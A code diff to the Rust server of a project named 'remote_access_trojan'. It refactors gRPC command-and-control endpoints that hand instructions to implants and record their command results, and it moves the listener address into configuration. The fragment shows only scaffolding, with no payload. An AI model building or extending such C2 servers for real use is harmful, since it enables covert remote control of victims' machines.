@@ -1,14 +1,11 @@
 use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
 use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
-use remote_access_trojan::rat::{self, Beacon, Empty, CommandRequest, CommandResponse};
+use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
 use tonic::{Request, Response, Status};
 use tonic::transport::Server;
 
 #[derive(Default)]
 pub struct MyAskForInstructions {}
-
-#[derive(Default)]
-pub struct MyRecordCommandResult {}
 
 #[tonic::async_trait]
 impl AskForInstructions for MyAskForInstructions {
@@ -23,6 +20,9 @@ impl AskForInstructions for MyAskForInstructions {
         ))
     }
 }
+
+#[derive(Default)]
+pub struct MyRecordCommandResult {}
 
 #[tonic::async_trait]
 impl RecordCommandResult for MyRecordCommandResult {
@@ -39,21 +39,15 @@ impl RecordCommandResult for MyRecordCommandResult {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("server");
 
-    // Does the protobuf structure work?
-    let example = rat::CommandRequest {
-        command:String::from("server words"),
-    };
-    println!("{example:?}");
-
     // Can I send a stand up the server?
-    let addr = "127.0.0.1:4444".parse()?;
+    let ip_address = rco_config::LISTENER_IP;
+    let port = rco_config::LISTENER_PORT;
+    let socket = format!("{ip_address}:{port}").parse()?;
 
-    let instructions_server = MyAskForInstructions::default();
-    let recording_server = MyRecordCommandResult::default();
     Server::builder()
-        .add_service(AskForInstructionsServer::new(instructions_server))
-        .add_service(RecordCommandResultServer::new(recording_server))
-        .serve(addr)
+        .add_service(AskForInstructionsServer::new(MyAskForInstructions::default()))
+        .add_service(RecordCommandResultServer::new(MyRecordCommandResult::default()))
+        .serve(socket)
         .await?;
 
     Ok(())
